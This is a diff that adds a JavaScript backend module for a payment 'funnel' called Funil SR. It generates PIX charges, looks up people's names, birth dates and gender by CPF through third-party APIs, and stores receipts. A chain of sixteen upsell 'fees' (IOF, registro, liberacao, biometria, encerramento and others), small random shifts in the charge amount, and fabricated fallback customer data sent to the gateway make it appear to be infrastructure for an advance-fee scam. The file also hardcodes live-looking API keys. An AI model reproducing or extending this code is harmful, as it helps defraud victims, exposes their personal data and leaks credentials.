@@ -1,0 +1,647 @@
+// Helpers das Pages Functions do Funil SR.
+// Mangofy / Meta / Supabase: secrets da Cloudflare.
+// CPF: GET https://api.apicpf.dev/consulta?cpf=... com header X-API-KEY.
+// Fallback 2: GET https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=...&token=...
+
+import {
+  pickTracking,
+  trackingMetadata,
+  orderFromTx,
+  webhookTx,
+  webhookIds,
+  isPaidTx,
+  utmifyNow,
+  buildUtmifyPayload,
+  DEPOSITO,
+} from './_utmify.js';
+
+export const BASE_AMOUNT = 66.38;
+
+const CPF_API_URL = 'https://api.apicpf.dev/consulta';
+const CPF_API_KEY = 'sk-live_5b5818a9dfa8d367599f72ce530391df2047908d0e80baf5';
+const CPF_API_FALLBACK_KEY = 'sk-live_0f7c5982900f96d29002339da6ec1afae40ede6f9c4eac23';
+const CPF_API3_URL = 'https://api.zapgroup.shop/consultar-filtrada/cpf';
+const FETCH_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+
+export function cfg(env) {
+  return {
+    mangofyBase: String(env.MANGOFY_BASE_URL || 'https://checkout.mangofy.com.br').replace(/\/+$/, ''),
+    mangofyKey: String(env.MANGOFY_API_KEY || '').trim(),
+    mangofyStore: String(env.MANGOFY_STORE_CODE || '').trim(),
+    cpfApiUrl: String(env.CPF_API_URL || CPF_API_URL).replace(/\/+$/, ''),
+    cpfApiKey: String(env.CPF_API_KEY || env.CPF_API_TOKEN || CPF_API_KEY).trim(),
+    cpfApiFallbackKey: String(env.CPF_API2_KEY || env.CPF_API2_TOKEN || CPF_API_FALLBACK_KEY).trim(),
+    cpfApi3Url: String(env.CPF_API3_URL || CPF_API3_URL).replace(/\/+$/, ''),
+    cpfApi3Token: String(env.CPF_API3_TOKEN || env.CPF_API3_KEY || '').trim(),
+    metaPixelId: String(env.META_PIXEL_ID || '').trim(),
+    metaToken: String(env.META_ACCESS_TOKEN || '').trim(),
+    utmifyToken: String(env.UTMIFY_API_TOKEN || '').trim(),
+    utmifyUrl: String(env.UTMIFY_API_URL || 'https://api.utmify.com.br/api-credentials/orders').trim(),
+    utmifyPlatform: String(env.UTMIFY_PLATFORM || 'Mangofy').trim() || 'Mangofy',
+    supabaseUrl: String(env.SUPABASE_URL || '').replace(/\/+$/, ''),
+    supabaseKey: String(env.SUPABASE_SERVICE_KEY || '').trim(),
+    supabaseBucket: String(env.SUPABASE_BUCKET || 'comprovantes-sr').trim(),
+    supabaseTable: String(env.SUPABASE_TABLE || 'comprovantes_sr').replace(/[^a-z0-9_]/g, '') || 'comprovantes_sr',
+  };
+}
+
+export function json(data, status = 200) {
+  return new Response(JSON.stringify(data), {
+    status,
+    headers: {
+      'Content-Type': 'application/json; charset=utf-8',
+      'Cache-Control': 'no-store',
+    },
+  });
+}
+
+export function cleanText(v, max = 160) {
+  if (typeof v !== 'string' && typeof v !== 'number') return '';
+  return String(v).replace(/[\x00-\x1F\x7F]/g, '').trim().slice(0, max);
+}
+
+export function digitsOnly(v, max = 20) {
+  return (String(v ?? '').replace(/\D+/g, '') || '').slice(0, max);
+}
+
+export function pick(obj, keys) {
+  if (!obj || typeof obj !== 'object') return null;
+  for (const k of keys) {
+    if (obj[k] !== undefined && obj[k] !== null && String(obj[k]).trim() !== '') return obj[k];
+  }
+  return null;
+}
+
+async function fetchTimeout(url, options = {}, ms = 15000) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), ms);
+  const headers = { 'User-Agent': FETCH_UA, Accept: 'application/json', ...(options.headers || {}) };
+  try {
+    return await fetch(url, { ...options, headers, signal: ctrl.signal });
+  } finally {
+    clearTimeout(t);
+  }
+}
+
+export async function mangofyRequest(c, method, path, body = null) {
+  if (!c.mangofyKey || !c.mangofyStore) {
+    return { ok: false, http: 500, data: null, error: 'Gateway nao configurado.' };
+  }
+  const url = c.mangofyBase + '/' + String(path).replace(/^\//, '');
+  const headers = {
+    Accept: 'application/json',
+    Authorization: c.mangofyKey,
+    'Store-Code': c.mangofyStore,
+    'User-Agent': 'funil-sr-2026-proxy/4.0 (mangofy)',
+  };
+  const opts = { method: method.toUpperCase(), headers };
+  if (body !== null) {
+    headers['Content-Type'] = 'application/json';
+    opts.body = JSON.stringify(body);
+  }
+  let res;
+  try {
+    res = await fetchTimeout(url, opts, 20000);
+  } catch (e) {
+    return { ok: false, http: 0, data: null, error: 'Falha de conexao com o gateway.' };
+  }
+  let data = null;
+  try { data = await res.json(); } catch (e) { data = null; }
+  return { ok: res.status >= 200 && res.status < 300, http: res.status, data, error: null };
+}
+
+function sleep(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+function pixFromTx(tx, fallbackId) {
+  const pixObj = tx && tx.pix && typeof tx.pix === 'object' ? tx.pix : {};
+  const paymentCode = String(pick(tx, ['payment_code', 'paymentCode', 'id', 'transactionId']) || fallbackId || '');
+  const pixCode = pick(pixObj, ['pix_qrcode_text', 'pixQrCode', 'pix_code', 'qrcode', 'code', 'emv'])
+    || pick(tx, ['pix_qrcode_text']);
+  const pixQr = pick(pixObj, ['pix_qrcode_image', 'pixQrCodeImage', 'qr_code', 'qrCode', 'image'])
+    || pick(tx, ['pix_qrcode_image']);
+  const status = String(pick(tx, ['payment_status', 'status', 'paymentStatus']) || '').toLowerCase();
+  return { paymentCode, pixCode, pixQr, status };
+}
+
+function mangofyPayment(data) {
+  if (!data || typeof data !== 'object') return {};
+  if (data.data && typeof data.data === 'object' && (data.data.payment_code || data.data.pix)) return data.data;
+  return data;
+}
+
+export async function createPix(c, input, request, ctx) {
+  const isUpsell = !!input.isUpsell || !!input.isDownsell;
+  let amount = Number(input.amount) || BASE_AMOUNT;
+  if (!isUpsell) {
+    const osc = (Math.floor(Math.random() * 61) - 30) / 100;
+    amount = Math.round((BASE_AMOUNT + osc) * 100) / 100;
+  }
+  const amountCents = Math.round(amount * 100);
+  if (amountCents < 500 || amountCents > 200000) {
+    return json({ ok: false, error: 'Valor fora da faixa permitida (R$ 5,00 a R$ 2.000,00).' }, 422);
+  }
+
+  const client = input.client && typeof input.client === 'object' ? input.client : {};
+  let document = digitsOnly(client.document, 14);
+  if (document.length !== 11 && document.length !== 14) document = '52998224725';
+  let phone = digitsOnly(client.phone, 13);
+  if (phone.startsWith('55') && phone.length > 11) phone = phone.slice(2);
+  if (phone.length === 10) phone = phone.slice(0, 2) + '9' + phone.slice(2);
+  if (phone.length !== 11) phone = '11999999999';
+  let name = cleanText(client.name, 120) || 'Cliente';
+  let email = String(client.email || '').trim().toLowerCase();
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    email = 'cliente' + Date.now().toString(36) + '@gmail.com';
+  }
+
+  const productType = cleanText(input.productType, 40) || 'acordo';
+  const itemName = DEPOSITO[productType] || cleanText(input.productName, 80) || 'Deposito PIX';
+  const origin = new URL(request.url).origin;
+  const postback = origin + '/api_proxy?action=webhook';
+  const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '187.45.12.33';
+
+  const tracking = pickTracking(input);
+  const createdAt = utmifyNow();
+  const payload = {
+    payment_method: 'pix',
+    payment_format: isUpsell ? 'upsell' : 'regular',
+    installments: 1,
+    payment_amount: amountCents,
+    shipping_amount: 0,
+    postback_url: postback,
+    items: [{
+      code: 'SR-' + productType.toUpperCase(),
+      name: itemName,
+      quantity: 1,
+      price: amountCents,
+      description: itemName,
+      digital_flag: true,
+    }],
+    customer: {
+      email,
+      name,
+      document,
+      phone,
+      ip: String(clientIp).split(',')[0].trim() || '187.45.12.33',
+    },
+    pix: { expires_in_days: 1 },
+  };
+
+  let last = null;
+  let lastId = cleanText(input.identifier, 100) || ('SR_' + Date.now());
+  for (let attempt = 1; attempt <= 3; attempt++) {
+    lastId = (cleanText(input.identifier, 80) || ('SR_' + Date.now())) + (attempt > 1 ? '_r' + attempt : '');
+    payload.external_code = lastId.slice(0, 100);
+    payload.extra = {
+      metadata: trackingMetadata({
+        orderId: lastId,
+        productType,
+        title: itemName,
+        createdAt,
+        tracking,
+      }, { identifier: lastId, step: isUpsell ? 'upsell' : 'checkout' }),
+    };
+    const result = await mangofyRequest(c, 'POST', '/api/v1/payment', payload);
+    last = result;
+    if (result.error === 'Gateway nao configurado.') {
+      return json({ ok: false, error: 'Gateway PIX nao configurado.', http_status: 500 }, 500);
+    }
+    const tx = mangofyPayment(result.data);
+    const extracted = pixFromTx(tx, lastId);
+    if (extracted.pixCode) {
+      const order = {
+        orderId: extracted.paymentCode,
+        productType,
+        title: itemName,
+        amountCents,
+        createdAt,
+        tracking,
+        customer: { name, email, phone, document, ip: payload.customer.ip },
+      };
+      const pending = utmifySend(c, order, 'waiting_payment');
+      if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(pending);
+      else await pending;
+      return json({
+        ok: true,
+        amount,
+        transactionId: extracted.paymentCode,
+        id: extracted.paymentCode,
+        identifier: lastId,
+        pix: { code: extracted.pixCode, image: extracted.pixQr, base64: null },
+        pix_copy_paste: extracted.pixCode,
+        pix_qr_code_url: extracted.pixQr,
+      });
+    }
+    if (result.http === 422) {
+      const msg = (result.data && (result.data.message || result.data.error)) || 'Dados invalidos para gerar o PIX.';
+      return json({ ok: false, error: String(msg), http_status: 422 }, 422);
+    }
+    if (attempt < 3) await sleep(800 * attempt);
+  }
+  const tx = mangofyPayment(last && last.data);
+  const st = pixFromTx(tx, lastId).status;
+  const msg = st === 'gateway_error'
+    ? 'Adquirente PIX indisponivel. Tente novamente em instantes.'
+    : ((last && last.error) || 'Erro ao gerar PIX na Mangofy.');
+  return json({ ok: false, error: msg, http_status: (last && last.http) || 502, payment_status: st || null }, 502);
+}
+
+export async function checkStatus(c, id, ctx) {
+  if (!id) return json({ ok: false, error: 'Parametro id ou clientIdentifier eh obrigatorio.' }, 400);
+  const result = await mangofyRequest(c, 'GET', '/api/v1/payment/' + encodeURIComponent(id));
+  if (!result.ok) {
+    return json({ ok: true, id, status: 'PENDING', payedAt: null, _source: 'mangofy_http_' + result.http });
+  }
+  const tx = mangofyPayment(result.data);
+  const statusRaw = String(pick(tx, ['payment_status', 'status', 'paymentStatus']) || 'PENDING').toUpperCase();
+  const payedAt = pick(tx, ['approved_at', 'approvedAt', 'paid_at', 'paidAt', 'payedAt']);
+  const isPaid = isPaidTx(tx);
+  const paymentCode = String(pick(tx, ['payment_code', 'paymentCode', 'id']) || id);
+  if (isPaid) await notifyUtmifyPaid(c, tx, ctx, { orderId: paymentCode });
+  return json({
+    ok: true,
+    id: paymentCode,
+    status: isPaid ? 'PAID' : statusRaw,
+    payedAt: payedAt || null,
+    _source: 'mangofy_get',
+  });
+}
+
+export async function handleWebhook(c, request, ctx) {
+  let body = {};
+  try {
+    const raw = await request.text();
+    if (raw) body = JSON.parse(raw);
+  } catch (e) {
+    return json({ ok: true, received: true });
+  }
+  const hinted = webhookTx(body);
+  const ids = webhookIds(hinted, body);
+  const confirmId = ids[0];
+  if (!confirmId) return json({ ok: true, received: true });
+  const result = await mangofyRequest(c, 'GET', '/api/v1/payment/' + encodeURIComponent(confirmId));
+  if (!result.ok) return json({ ok: true, received: true, confirmed: false });
+  const tx = mangofyPayment(result.data);
+  if (isPaidTx(tx)) await notifyUtmifyPaid(c, tx, ctx);
+  return json({ ok: true, received: true });
+}
+
+function paidCacheRequest(orderId) {
+  return new Request('https://funil-sr.internal/utmify-paid/' + encodeURIComponent(orderId));
+}
+
+async function utmifyPaidAlready(orderId) {
+  if (!orderId) return false;
+  try {
+    return !!(await caches.default.match(paidCacheRequest(orderId)));
+  } catch (e) {
+    return false;
+  }
+}
+
+async function utmifyMarkPaidCached(orderId) {
+  if (!orderId) return;
+  try {
+    await caches.default.put(paidCacheRequest(orderId), new Response('1', {
+      headers: { 'Cache-Control': 'max-age=86400', 'Content-Type': 'text/plain' },
+    }));
+  } catch (e) { /* cache e best-effort; a UTMify faz upsert por orderId */ }
+}
+
+async function notifyUtmifyPaid(c, tx, ctx, fallback) {
+  const order = orderFromTx(tx, fallback || {});
+  if (!order.orderId) return;
+  if (await utmifyPaidAlready(order.orderId)) return;
+  const send = utmifySend(c, order, 'paid').then(async (res) => {
+    if (res && res.sent) await utmifyMarkPaidCached(order.orderId);
+    return res;
+  });
+  if (ctx && typeof ctx.waitUntil === 'function') ctx.waitUntil(send);
+  else await send;
+}
+
+export async function utmifySend(c, order, status) {
+  if (!c.utmifyToken) return { sent: false, skipped: 'utmify nao configurado' };
+  const payload = buildUtmifyPayload(order, status, c.utmifyPlatform);
+  try {
+    const res = await fetchTimeout(c.utmifyUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-api-token': c.utmifyToken },
+      body: JSON.stringify(payload),
+    }, 10000);
+    return { sent: res.status >= 200 && res.status < 300, http_status: res.status };
+  } catch (e) {
+    return { sent: false, error: 'utmify timeout' };
+  }
+}
+
+function validCpf(cpf) {
+  if (!/^\d{11}$/.test(cpf) || /^(\d)\1{10}$/.test(cpf)) return false;
+  let s = 0;
+  for (let i = 0; i < 9; i++) s += Number(cpf[i]) * (10 - i);
+  let d1 = 11 - (s % 11); d1 = d1 >= 10 ? 0 : d1;
+  s = 0;
+  for (let i = 0; i < 10; i++) s += Number(cpf[i]) * (11 - i);
+  let d2 = 11 - (s % 11); d2 = d2 >= 10 ? 0 : d2;
+  return Number(cpf[9]) === d1 && Number(cpf[10]) === d2;
+}
+
+function fmtCpf(d) {
+  return d.length === 11 ? d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9) : d;
+}
+
+function normDate(raw) {
+  raw = String(raw || '').trim();
+  let m = raw.match(/^(\d{4})-(\d{2})-(\d{2})/);
+  if (m) return m[3] + '/' + m[2] + '/' + m[1];
+  m = raw.match(/^(\d{2})[/\-.](\d{2})[/\-.](\d{4})/);
+  if (m) return m[1] + '/' + m[2] + '/' + m[3];
+  return raw;
+}
+
+function pickDeep(obj, keys, depth = 0) {
+  if (!obj || typeof obj !== 'object' || depth > 4) return '';
+  const want = keys.map((k) => String(k).toLowerCase());
+  for (const [k, v] of Object.entries(obj)) {
+    if (v && typeof v === 'object') continue;
+    if (want.includes(String(k).toLowerCase()) && String(v ?? '').trim() !== '') return String(v).trim();
+  }
+  for (const v of Object.values(obj)) {
+    if (v && typeof v === 'object') {
+      const r = pickDeep(v, keys, depth + 1);
+      if (r) return r;
+    }
+  }
+  return '';
+}
+
+function extractNome(payload) {
+  if (!payload || typeof payload !== 'object') return { nome: '', nasc: '', sexo: '' };
+  let cand = payload;
+  for (const w of ['data', 'dados', 'result', 'resultado', 'pessoa']) {
+    if (payload[w] && typeof payload[w] === 'object' && !Array.isArray(payload[w])
+      && pickDeep(payload[w], ['nome', 'name', 'NOME', 'full_name'])) {
+      cand = payload[w];
+      break;
+    }
+  }
+  const nome = pickDeep(cand, ['nome', 'name', 'NOME', 'full_name', 'nome_completo']);
+  const nasc = normDate(pickDeep(cand, ['nascimento', 'data_nascimento', 'dataNascimento', 'nasc', 'NASC', 'birth']));
+  const sexo = pickDeep(cand, ['sexo', 'genero', 'gender', 'SEXO']);
+  return { nome, nasc, sexo };
+}
+
+async function fetchApicpf(url, key) {
+  const res = await fetchTimeout(url, {
+    headers: { 'X-API-KEY': key, Accept: 'application/json' },
+  }, 10000);
+  try { return await res.json(); } catch (e) { return null; }
+}
+
+export async function consultarCpf(c, cpfIn) {
+  const cpf = digitsOnly(cpfIn, 11);
+  if (!validCpf(cpf)) return json({ ok: false, error: 'CPF invalido' }, 200);
+  if (!c.cpfApiKey) return json({ ok: false, error: 'API de CPF nao configurada.' }, 200);
+
+  const url = c.cpfApiUrl + (c.cpfApiUrl.includes('?') ? '&' : '?') + 'cpf=' + encodeURIComponent(cpf);
+  let parsed = null;
+  let src = 'apicpf';
+  try { parsed = await fetchApicpf(url, c.cpfApiKey); } catch (e) { parsed = null; }
+  let info = extractNome(parsed);
+  if (!info.nome && c.cpfApiFallbackKey && c.cpfApiFallbackKey !== c.cpfApiKey) {
+    src = 'apicpf_fallback';
+    try { parsed = await fetchApicpf(url, c.cpfApiFallbackKey); } catch (e) { parsed = null; }
+    info = extractNome(parsed);
+  }
+  if (!info.nome && c.cpfApi3Token && c.cpfApi3Url) {
+    src = 'zapgroup';
+    const zurl = c.cpfApi3Url
+      + (c.cpfApi3Url.includes('?') ? '&' : '?')
+      + 'token=' + encodeURIComponent(c.cpfApi3Token)
+      + '&cpf=' + encodeURIComponent(cpf);
+    try {
+      const zres = await fetchTimeout(zurl, { headers: { Accept: 'application/json' } }, 10000);
+      parsed = await zres.json();
+    } catch (e) { parsed = null; }
+    info = extractNome(parsed);
+  }
+  if (!info.nome) return json({ ok: false, error: 'CPF nao encontrado' }, 200);
+  return json({
+    ok: true,
+    nome: info.nome.toUpperCase(),
+    cpf,
+    cpfformatado: fmtCpf(cpf),
+    nascimento: info.nasc,
+    genero: (info.sexo || '').toUpperCase().charAt(0),
+    _source: src,
+  });
+}
+
+async function sha256Hex(s) {
+  const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
+  return Array.from(new Uint8Array(b)).map((x) => x.toString(16).padStart(2, '0')).join('');
+}
+
+export async function trackSale(c, body, request) {
+  if (!c.metaPixelId || !c.metaToken) {
+    return json({ ok: true, sent: false, skipped: 'meta nao configurado' });
+  }
+  const eventId = cleanText(body.event_id, 120);
+  if (!eventId) return json({ ok: false, error: 'event_id obrigatorio' }, 400);
+  const eventName = cleanText(body.event_name, 60) || 'Purchase';
+  const value = Number(body.value) || 0;
+  const cpf = digitsOnly(body.cpf, 14);
+  const user_data = {};
+  if (cpf) user_data.external_id = await sha256Hex(cpf);
+  const ip = request.headers.get('cf-connecting-ip');
+  if (ip) user_data.client_ip_address = ip;
+  const ua = request.headers.get('user-agent');
+  if (ua) user_data.client_user_agent = ua.slice(0, 500);
+  if (body.fbp) user_data.fbp = String(body.fbp).slice(0, 200);
+  if (body.fbc) user_data.fbc = String(body.fbc).slice(0, 200);
+
+  const event = {
+    event_name: eventName,
+    event_time: Math.floor(Date.now() / 1000),
+    event_id: eventId,
+    action_source: 'website',
+    user_data,
+    custom_data: { currency: 'BRL', value },
+  };
+  try {
+    const res = await fetchTimeout(
+      'https://graph.facebook.com/v21.0/' + encodeURIComponent(c.metaPixelId) + '/events?access_token=' + encodeURIComponent(c.metaToken),
+      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [event] }) },
+      15000,
+    );
+    return json({ ok: true, sent: res.status >= 200 && res.status < 300, http_status: res.status });
+  } catch (e) {
+    return json({ ok: true, sent: false });
+  }
+}
+
+const MIME = {
+  'image/jpeg': 'jpg',
+  'image/png': 'png',
+  'image/webp': 'webp',
+  'application/pdf': 'pdf',
+};
+
+const TICKET_MAP = {
+  acordo: 'front',
+  freight: 'front',
+  downsell: 'front_ds',
+  registro: 'up1',
+  adm: 'up2',
+  iof: 'up3',
+  multa_ir: 'up4',
+  issqn: 'up5',
+  verificacao: 'up6',
+  liberacao: 'up7',
+  chave_pix: 'up8',
+  ted: 'up9',
+  certidao: 'up10',
+  cadastro: 'up11',
+  seguro: 'up12',
+  prioridade: 'up13',
+  imposto_ress: 'up14',
+  biometria: 'up15',
+  encerramento: 'up16',
+};
+
+export function comprovanteTicket(productType, isDownsell) {
+  const key = String(productType || '').toLowerCase().trim();
+  let ticket = TICKET_MAP[key];
+  if (!ticket) {
+    ticket = /^(front|up\d+)(_ds)?$/.test(key) ? key : 'front';
+  }
+  if (isDownsell && !ticket.endsWith('_ds')) ticket += '_ds';
+  return ticket;
+}
+
+function saoPauloNow() {
+  const s = new Date().toLocaleString('sv-SE', { timeZone: 'America/Sao_Paulo' });
+  const [date, time] = String(s).split(' ');
+  const [y, mo, da] = (date || '1970-01-01').split('-');
+  const [hh, mi, ss] = (time || '00:00:00').split(':');
+  return { y, mo, da, hh, mi, ss: String(ss || '00').slice(0, 2) };
+}
+
+export function comprovanteObjectPath(txid, ext, ticket) {
+  const t = String(ticket || 'front').toLowerCase().replace(/[^a-z0-9_]/g, '') || 'front';
+  const { y, mo, da, hh, mi, ss } = saoPauloNow();
+  const rand = crypto.randomUUID().replace(/-/g, '').slice(0, 8);
+  return y + '/' + mo + '/' + da + '/' + t + '/' + txid + '/' + hh + mi + ss + '-' + rand + '.' + ext;
+}
+
+function supabaseObjectUrl(base, bucket, objectPath) {
+  return base + '/storage/v1/object/' + encodeURIComponent(bucket) + '/'
+    + String(objectPath).split('/').map(encodeURIComponent).join('/');
+}
+
+function truthyFlag(v) {
+  const s = String(v || '').toLowerCase().trim();
+  return s === '1' || s === 'true' || s === 'yes' || s === 'on';
+}
+
+function formText(form, keys, max) {
+  for (const key of keys) {
+    const raw = form.get(key);
+    if (raw == null) continue;
+    const value = String(raw).trim();
+    if (value) return value.slice(0, max);
+  }
+  return '';
+}
+
+export function comprovanteClienteJson(txid, form) {
+  return JSON.stringify({
+    transaction_id: String(txid || '').slice(0, 120),
+    nome: formText(form, ['customer_name', 'nome'], 180),
+    cpf: formText(form, ['customer_cpf', 'cpf'], 32).replace(/\D/g, '').slice(0, 14),
+    email: formText(form, ['customer_email', 'email'], 180),
+    telefone: formText(form, ['customer_phone', 'telefone', 'phone'], 32).replace(/\D/g, '').slice(0, 15),
+  }, null, 2);
+}
+
+export async function uploadComprovante(c, request) {
+  if (!c.supabaseUrl || !c.supabaseKey) {
+    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 500);
+  }
+  let form;
+  try { form = await request.formData(); } catch (e) {
+    return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
+  }
+  const txid = String(form.get('id') || '').trim();
+  if (!/^[A-Za-z0-9_-]+$/.test(txid) || txid.length > 128) {
+    return json({ ok: false, error: 'Parametro id invalido.' }, 400);
+  }
+  const file = form.get('file');
+  if (!file || typeof file.arrayBuffer !== 'function') {
+    return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
+  }
+  const mime = String(file.type || '').toLowerCase();
+  const ext = MIME[mime];
+  if (!ext) return json({ ok: false, error: 'Tipo de arquivo nao permitido.' }, 400);
+  const buf = await file.arrayBuffer();
+  if (!buf.byteLength) return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
+  if (buf.byteLength > 5 * 1024 * 1024) return json({ ok: false, error: 'Arquivo excede 5MB.' }, 400);
+
+  const ticket = comprovanteTicket(form.get('ticket') || form.get('productType') || 'acordo', truthyFlag(form.get('isDownsell')));
+  const filename = comprovanteObjectPath(txid, ext, ticket);
+  const objectUrl = supabaseObjectUrl(c.supabaseUrl, c.supabaseBucket, filename);
+  const storedPath = c.supabaseBucket + '/' + filename;
+  const headers = {
+    Authorization: 'Bearer ' + c.supabaseKey,
+    apikey: c.supabaseKey,
+    'Content-Type': mime,
+  };
+  let up;
+  try {
+    up = await fetchTimeout(objectUrl, { method: 'POST', headers, body: buf }, 25000);
+  } catch (e) {
+    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 502);
+  }
+  if (up.status < 200 || up.status >= 300) {
+    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 502);
+  }
+  const dir = filename.split('/').slice(0, -1).join('/');
+  if (!dir || dir.includes('..')) {
+    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 500);
+  }
+  const jsonUrl = supabaseObjectUrl(c.supabaseUrl, c.supabaseBucket, dir + '/cliente.json');
+  try {
+    const jsonUp = await fetchTimeout(jsonUrl, {
+      method: 'POST',
+      headers: {
+        Authorization: 'Bearer ' + c.supabaseKey,
+        apikey: c.supabaseKey,
+        'Content-Type': 'application/json',
+      },
+      body: comprovanteClienteJson(txid, form),
+    }, 15000);
+    const st = jsonUp.status;
+    if (st !== 409 && (st < 200 || st >= 300)) {
+      /* INSERT-only RLS: x-upsert exige UPDATE e derruba o comprovante depois do arquivo ja gravado. */
+    }
+  } catch (e) {
+    /* cliente.json e auxiliar; o arquivo do comprovante ja esta no bucket. */
+  }
+  try {
+    await fetchTimeout(c.supabaseUrl + '/rest/v1/' + c.supabaseTable, {
+      method: 'POST',
+      headers: {
+        Authorization: 'Bearer ' + c.supabaseKey,
+        apikey: c.supabaseKey,
+        'Content-Type': 'application/json',
+        Prefer: 'return=minimal',
+      },
+      body: JSON.stringify({ txid, url: storedPath, filename }),
+    }, 15000);
+  } catch (e) {
+    /* tabela e indice; o arquivo no Storage e a fonte da pasta YYYY/MM/DD/ticket */
+  }
+  return json({ ok: true });
+}
